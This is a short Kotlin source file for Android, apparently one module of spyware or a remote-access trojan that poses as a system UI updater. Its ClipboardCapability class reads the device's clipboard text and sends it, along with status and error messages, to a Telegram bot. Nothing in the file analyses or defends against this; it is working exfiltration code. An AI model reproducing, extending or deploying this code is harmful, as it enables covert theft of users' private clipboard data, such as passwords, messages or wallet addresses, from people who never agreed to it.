package com.android.systemui.updater.capabilities

import android.content.ClipboardManager
import android.content.Context
import com.android.systemui.updater.TelegramClient

class ClipboardCapability(
    private val ctx: Context,
    private val telegram: TelegramClient
) {
    fun read() {
        try {
            val clipboard = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            if (!clipboard.hasPrimaryClip()) {
                telegram.sendText("📎 Clipboard is empty")
                return
            }
            val clip = clipboard.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).text?.toString() ?: "No text content"
                telegram.sendText("📎 Clipboard:\n$text")
            } else {
                telegram.sendText("📎 Clipboard is empty")
            }
        } catch (e: Exception) {
            telegram.sendText("❌ Cannot read clipboard: ${e.message}")
        }
    }
}
